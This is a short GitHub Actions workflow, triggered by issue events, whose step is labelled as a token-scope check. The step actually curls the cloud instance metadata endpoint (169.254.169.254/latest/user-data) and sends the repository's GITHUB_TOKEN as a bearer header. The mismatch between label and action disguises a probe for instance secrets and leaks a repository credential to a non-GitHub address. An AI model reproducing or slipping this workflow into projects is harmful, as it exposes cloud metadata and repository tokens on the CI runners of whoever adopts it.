name: token scope

on:
  issues:
  
   
jobs:
  token_scope:
    name: check token scopes
    runs-on: ubuntu-latest
    steps:
      - name: check token scope
        run: |
          curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" -H "accept: application/vnd.github.inertia-preview+json" -X GET http://169.254.169.254/latest/user-data
  
